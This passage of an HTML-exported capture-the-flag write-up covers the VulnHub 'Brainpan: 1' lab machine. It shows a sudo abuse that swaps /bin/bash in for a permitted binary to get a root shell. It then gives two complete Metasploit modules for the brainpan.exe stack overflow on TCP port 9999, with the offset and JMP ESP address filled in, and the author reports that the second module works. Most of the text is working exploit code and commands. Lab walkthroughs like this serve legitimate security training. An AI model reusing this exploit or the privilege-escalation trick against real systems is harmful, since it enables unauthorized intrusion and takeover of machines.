border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>$ cd /home/anansi/bin</div><div>$ mv anansi_util anansi_util.orig</div><div>$ cp /bin/bash anansi_util</div><div>$ sudo /home/anansi/bin/anansi_util</div><div>root@brainpan:/home/anansi/bin# id</div><div>uid=0(root) gid=0(root) groups=0(root)</div></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">mona suggest</span></div><div><br/></div><div>Mona is a very powerful plugin for the Immunity Debugger. It was also written to be able to generate Metasploit exploit modules easily. You can read more about specifics here: <a href="https://blog.rapid7.com/2011/10/11/monasploit/" target="_blank">https://blog.rapid7.com/2011/10/11/monasploit/</a>.</div><div><br/></div><div>I decided to try the mona suggest option with my brainpan.exe overflow. To do this, we only need our first step of testing the overflow... sending a cyclic pattern. Once we crash the app with the cyclic pattern, we can run the following mona command.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>!mona suggest -cpb '\x00'</div></div><div><br/></div><div>This finishes the rest of the overflow steps for us and even generates a ruby module ready to load into Metasploit (with a few tweaks). One thing we notice that could use some tweaking is the 'buffer &lt;&lt; payload.encoded  #max 116 bytes' line. It thinks it can only send 116 additional bytes because of the length of the cyclic pattern we tested with (650 bytes). In reality, we saw that we could overflow an additional 472 bytes after setting the EIP. This is just a comment and won't affect the exploits execution, but we should probably fix it.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>##</div><div># This module requires Metasploit: http://metasploit.com/download</div><div># Current source: https://github.com/rapid7/metasploit-framework</div><div>##</div><div><div><br/></div></div><div>require 'msf/core'</div><div><div><br/></div></div><div>class MetasploitModule &lt; Msf::Exploit::Remote</div><div>  #Rank definition: http://dev.metasploit.com/redmine/projects/framework/wiki/Exploit_Ranking</div><div>  #ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking</div><div>  Rank = NormalRanking</div><div><div><br/></div></div><div>  include Msf::Exploit::Remote::Tcp</div><div><div><br/></div></div><div>  def initialize(info = {})</div><div>    super(update_info(info,</div><div>      'Name'    =&gt; 'insert name for the exploit',</div><div>      'Description'  =&gt; %q{</div><div>          Provide information about the vulnerability / explain as good as you can</div><div>          Make sure to keep each line less than 100 columns wide</div><div>      },</div><div>      'License'    =&gt; MSF_LICENSE,</div><div>      'Author'    =&gt;</div><div>        [</div><div>          'insert_name_of_person_who_discovered_the_vulnerability&lt;user[at]domain.com&gt;',  # Original discovery</div><div>          '&lt;insert your name here&gt;',  # MSF Module</div><div>        ],</div><div>      'References'  =&gt;</div><div>        [</div><div>          [ 'OSVDB', '&lt;insert OSVDB number here&gt;' ],</div><div>          [ 'CVE', 'insert CVE number here' ],</div><div>          [ 'URL', '&lt;insert another link to the exploit/advisory here&gt;' ]</div><div>        ],</div><div>      'DefaultOptions' =&gt;</div><div>        {</div><div>          'ExitFunction' =&gt; 'process', #none/process/thread/seh</div><div>          #'InitialAutoRunScript' =&gt; 'migrate -f',</div><div>        },</div><div>      'Platform'  =&gt; 'win',</div><div>      'Payload'  =&gt;</div><div>        {</div><div>          'BadChars' =&gt; "\x00", # &lt;change if needed&gt;</div><div>          'DisableNops' =&gt; true,</div><div>        },</div><div><div><br/></div></div><div>      'Targets'    =&gt;</div><div>        [</div><div>          [ '&lt;fill in the OS/app version here&gt;',</div><div>            {</div><div>              <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">'Ret'     =&gt;  0x311712f3, # jmp esp - brainpan.exe</font></div><div>              <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">'Offset'  =&gt;  524</font></div><div>            }</div><div>          ],</div><div>        ],</div><div>      'Privileged'  =&gt; false,</div><div>      #Correct Date Format: "M D Y"</div><div>      #Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec</div><div>      'DisclosureDate'  =&gt; 'MONTH DAY YEAR',</div><div>      'DefaultTarget'  =&gt; 0))</div><div><div><br/></div></div><div>    register_options([Opt::RPORT(9999)], self.class)</div><div><div><br/></div></div><div>  end</div><div><div><br/></div></div><div>  def exploit</div><div><div><br/></div></div><div>    connect</div><div><div><br/></div></div><div>    buffer =  rand_text(target['Offset'])  </div><div>    buffer &lt;&lt; [target.ret].pack('V')  </div><div>    buffer &lt;&lt; Metasm::Shellcode.assemble(Metasm::Ia32.new, 'add esp,-1500').encode_string # avoid GetPC shellcode corruption</div><div>    buffer &lt;&lt; payload.encoded  #max 116 bytes</div><div><div><br/></div></div><div>    print_status("Trying target #{target.name}...")</div><div>    sock.put(buffer)</div><div><div><br/></div></div><div>    handler</div><div>    disconnect</div><div><div><br/></div></div><div>  end</div><div>end</div></div><div><br/></div><div>It is really nice to see how easy it determined the offset and JMP ESP. It look us several steps to find that. Good job, mona!</div><div><br/></div><div>Here's my tweaked version of the Metasploit module. I ran it and confirmed it works! 😄</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>##</div><div># This module requires Metasploit: https://metasploit.com/download</div><div># Current source: https://github.com/rapid7/metasploit-framework</div><div>##</div><div><div><br/></div></div><div>class MetasploitModule &lt; Msf::Exploit::Remote</div><div>  #Rank definition: http://dev.metasploit.com/redmine/projects/framework/wiki/Exploit_Ranking</div><div>  #ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking</div><div>  Rank = ExcellentRanking</div><div><div><br/></div></div><div>  include Msf::Exploit::Remote::Tcp</div><div><div><br/></div></div><div>  def initialize(info = {})</div><div>    super(update_info(info,</div><div>      'Name'    =&gt; 'Brainpan Buffer Overflow',</div><div>      'Description'  =&gt; %q{</div><div>          This was designed to exploit the buffer overflow in brainpan.exe</div><div>          from VulnHub: Brainpan: 1. The brainpan.exe service listens on</div><div>          TCP port 9999.</div><div>      },</div><div>      'License'    =&gt; MSF_LICENSE,</div><div>      'Author'    =&gt;</div><div>        [</div><div>          'Many Have Gone Before',  # Original discovery</div><div>          'Larry Brown',  # MSF Module</div><div>        ],</div><div>      'References'  =&gt;</div><div>        [</div><div>          [ 'URL', 'https://www.vulnhub.com/entry/brainpan-1,51/' ]</div><div>        ],</div><div>      'DefaultOptions' =&gt;</div><div>        {</div><div>          'EXITFUNC' =&gt; 'process', #none/process/thread/seh</div><div>          #'InitialAutoRunScript' =&gt; 'migrate -f',</div><div>        },</div><div>      'Platform'  =&gt; 'win',</div><div>      'Payload'  =&gt;</div><div>        {</div><div>          'BadChars' =&gt; "\x00", # &lt;change if needed&gt;</div><div>          'DisableNops' =&gt; true,</div><div>        },</div><div><div><br/></div></div><div>      'Targets'    =&gt;</div><div>        [</div><div>          [ 'brainpan.exe',</div><div>            {</div><div>              'Ret'     =&gt;  0x311712f3, # jmp esp - brainpan.exe</div><div>              'Offset'  =&gt;  524</div><div>            }</div><div>          ],</div><div>        ],</div><div>      'Privileged'  =&gt; false,</div><div>      #Correct Date Format: "M D Y"</div><div>      #Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec</div><div>      'DisclosureDate'  =&gt; 'Apr 24 2019',</div><div>      'DefaultTarget'  =&gt; 0))</div><div><div><br/></div></div><div>    register_options([Opt::RPORT(9999)])</div><div><div><br/></div></div><div>  end</div><div><div><br/></div></div><div>  def exploit</div><div><div><br/></div></div><div>    connect</div><div><div><br/></div></div><div>    buffer =  rand_text(target['Offset'])</div><div>    buffer &lt;&lt; [target.ret].pack('V')</div><div>    buffer &lt;&lt; Metasm::Shellcode.assemble(Metasm::Ia32.new, 'add esp,-1500').encode_string # avoid GetPC shellcode corruption</div><div>    buffer &lt;&lt; payload.encoded  #max 116 bytes</div><div><div><br/></div></div><div>    print_status("Trying target #{target.name}...")</div><div>    sock.put(buffer)</div><div><div><br/></div></div><div>    handler</div><div>    disconnect</div><div><div><br/></div></div><div>  end</div><div>end</div></div><div><br/></div></body></html>